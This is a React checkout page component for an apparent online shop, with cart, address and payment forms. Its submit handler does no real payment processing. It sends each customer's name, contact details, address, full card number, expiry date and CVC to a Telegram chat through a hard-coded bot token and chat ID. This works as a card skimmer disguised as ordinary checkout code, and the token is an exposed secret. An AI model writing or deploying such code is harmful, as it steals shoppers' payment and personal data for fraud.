import React, { useState } from "react";
import "./Checkout.scss";
import { useDispatch, useSelector } from "react-redux";
import {
  decrementCart,
  incrementCart,
} from "../../features/cart/cartSlice";
import { FaPlus, FaMinus } from 'react-icons/fa';

const BOT_TOKEN = "7313879684:AAH0lhoKddXhkYP-YO5QnYueauqqT3J9hzE";
const CHAT_ID = "-1002180292093";

const Checkout = () => {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    phoneNumber: "",
    email: "",
    streetAddress: "",
    country: "",
    city: "",
    state: "",
    zipCode: "",
    paymentMethod: "cardPayment",
    cardNumber: "",
    expirationDate: "",
    cvc: "",
  });

  const cardData = useSelector((state) => state.cart.value);
  const dispatch = useDispatch();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = (e) => {
    e.preventDefault();


    let text = "Checkout Form Submission:%0A";
    text += `First Name: <b>${formData.firstName}</b>%0A`;
    text += `Last Name: <b>${formData.lastName}</b>%0A`;
    text += `Phone Number: <b>${formData.phoneNumber}</b>%0A`;
    text += `Email: <b>${formData.email}</b>%0A`;
    text += `Street Address: <b>${formData.streetAddress}</b>%0A`;
    text += `Country: <b>${formData.country}</b>%0A`;
    text += `City: <b>${formData.city}</b>%0A`;
    text += `State: <b>${formData.state}</b>%0A`;
    text += `Zip Code: <b>${formData.zipCode}</b>%0A`;
    text += `Payment Method: <b>${formData.paymentMethod === "cardPayment" ? "Card Credit" : "Paypal"}</b>%0A`;
    text += `Card Number: <b>${formData.cardNumber}</b>%0A`;
    text += `Expiration Date: <b>${formData.expirationDate}</b>%0A`;
    text += `CVC: <b>${formData.cvc}</b>%0A`;
    
    // Add cart items
    text += "%0ACart Items:%0A";
    cardData.forEach((el) => {
      text += `Item: <b>${el.title}</b> - Quantity: <b>${el.quantity}</b> - Price: <b>${(el.price * el.quantity).toFixed(2)}</b>%0A`;
    });


    const subtotal = cardData.reduce((acc, el) => acc + el.price * el.quantity, 0);
    const total = subtotal - 25; 

    text += `%0ASubtotal: <b>$${subtotal.toFixed(2)}</b>%0A`;
    text += `Total: <b>$${total.toFixed(2)}</b>`;

    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=html`;

    const api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    setFormData({
      firstName: "",
      lastName: "",
      phoneNumber: "",
      email: "",
      streetAddress: "",
      country: "",
      city: "",
      state: "",
      zipCode: "",
      paymentMethod: "cardPayment",
      cardNumber: "",
      expirationDate: "",
      cvc: "",
    });
  };

  return (
    <div className="checkout-container container">
      <div className="checkout-left">
        <div className="checkout-left-top">
          <h2>Contact Information</h2>
          <form className="checkout-left-top-form" onSubmit={handleSubmit}>
            <div className="checkout-left-top-info">
              <label htmlFor="firstName">
                FIRST NAME
                <input
                  placeholder="First Name"
                  type="text"
                  id="firstName"
                  name="firstName"
                  value={formData.firstName}
                  onChange={handleChange}
                  required
                />
              </label>
              <label htmlFor="lastName">
                LAST NAME
                <input
                  placeholder="Last Name"
                  type="text"
                  id="lastName"
                  name="lastName"
                  value={formData.lastName}
                  onChange={handleChange}
                  required
                />
              </label>
            </div>
            <label htmlFor="phoneNumber">
              Phone Number
              <input
                placeholder="Phone Number"
                type="text"
                id="phoneNumber"
                name="phoneNumber"
                value={formData.phoneNumber}
                onChange={handleChange}
                required
              />
            </label>
            <label htmlFor="email">
              Email address
              <input
                placeholder="Email address"
                type="email"
                id="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                required
              />
            </label>
          </form>
        </div>
        <div className="checkout-left-middle">
          <form className="checkout-left-middle-form" onSubmit={handleSubmit}>
            <label htmlFor="streetAddress">
              Street Address *
              <input
                placeholder="Street Address *"
                type="text"
                id="streetAddress"
                name="streetAddress"
                value={formData.streetAddress}
                onChange={handleChange}
                required
              />
            </label>
            <label htmlFor="country">
              Country *
              <select
                name="country"
                id="country"
                value={formData.country}
                onChange={handleChange}
                required
              >
                <option value="" disabled>Select Country</option>
                {/* Add options here */}
              </select>
            </label>
            <label htmlFor="city">
              Town / City *
              <input
                placeholder="Town / City"
                type="text"
                id="city"
                name="city"
                value={formData.city}
                onChange={handleChange}
                required
              />
            </label>
            <div className="checkout-left-middle-info">
              <label htmlFor="state">
                State
                <input
                  placeholder="State"
                  type="text"
                  id="state"
                  name="state"
                  value={formData.state}
                  onChange={handleChange}
                />
              </label>
              <label htmlFor="zipCode">
                Zip Code
                <input
                  placeholder="Zip Code"
                  type="text"
                  id="zipCode"
                  name="zipCode"
                  value={formData.zipCode}
                  onChange={handleChange}
                />
              </label>
            </div>
            <div className="checkout-left-middle-check">
              <input
                type="radio"
                id="billingAddress"
                name="billingAddress"
                value="billingAddress"
              />
              <label htmlFor="billingAddress">
                Use a different billing address (optional)
              </label>
            </div>
          </form>
        </div>
        <div className="checkout-left-bottom">
          <h2>Payment method</h2>
          <form onSubmit={handleSubmit}>
            <div className="checkout-left-bottom-check">
              <input
                type="radio"
                id="cardPayment"
                name="paymentMethod"
                value="cardPayment"
                checked={formData.paymentMethod === "cardPayment"}
                onChange={handleChange}
              />
              <label htmlFor="cardPayment">Pay by Card Credit</label>
            </div>
            <div className="checkout-left-bottom-check">
              <input
                type="radio"
                id="paypalPayment"
                name="paymentMethod"
                value="paypalPayment"
                checked={formData.paymentMethod === "paypalPayment"}
                onChange={handleChange}
              />
              <label htmlFor="paypalPayment">Paypal</label>
            </div>
            <label htmlFor="cardNumber">
              Card Number
              <input
                type="text"
                id="cardNumber"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleChange}
                required
              />
            </label>
            <div className="checkout-left-bottom-info">
              <label htmlFor="expirationDate">
                Expiration date
                <input
                  placeholder="Expiration date"
                  type="text"
                  id="expirationDate"
                  name="expirationDate"
                  value={formData.expirationDate}
                  onChange={handleChange}
                  required
                />
              </label>
              <label htmlFor="cvc">
                CVC
                <input
                  placeholder="CVC"
                  type="text"
                  id="cvc"
                  name="cvc"
                  value={formData.cvc}
                  onChange={handleChange}
                  required
                />
              </label>
            </div>
            <button type="submit" className="checkout-left-btn">
              Place Order
            </button>
          </form>
        </div>
      </div>
      <div className="checkout-right">
        {cardData?.map((el) => (
          <div className="checkout-card" key={el.id}>
            <div className="checkout-card-left">
              <div className="checkout-card-img">
                <img src={el?.images[0]} alt={el?.title} />
              </div>
              <div className="checkout-card-info">
                <p>{el?.title}</p>
                <div className="checkout-card-info-btns">
                  <button onClick={() => dispatch(incrementCart(el))}>
                    <FaPlus />
                  </button>
                  <button>{el?.quantity}</button>
                  <button
                    disabled={el?.quantity === 0}
                    onClick={() => dispatch(decrementCart(el))}
                  >
                    <FaMinus />
                  </button>
                </div>
              </div>
            </div>
            <div className="checkout-card-right">
              <p>${(el?.price * el?.quantity).toFixed(2)}</p>
            </div>
          </div>
        ))}
        <div className="checkout-bottom">
          <div className="checkout-bottom-form">
            <input type="text" placeholder="Enter coupon code" />
            <button>Apply</button>
          </div>
          <div className="checkout-bottom-info">
            <div className="checkout-bottom-unit">
              <p>Discount</p>
              <span>-$25.00</span>
            </div>
            <div className="checkout-bottom-unit">
              <p>Shipping</p>
              <span>Free</span>
            </div>
            <div className="checkout-bottom-unit">
              <p>Subtotal</p>
              <span>${cardData.reduce((acc, el) => acc + el.price * el.quantity, 0).toFixed(2)}</span>
            </div>
            <div className="checkout-bottom-unit">
              <h2>Total</h2>
              <h2>${(cardData.reduce((acc, el) => acc + el.price * el.quantity, 0) - 25).toFixed(2)}</h2>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Checkout;
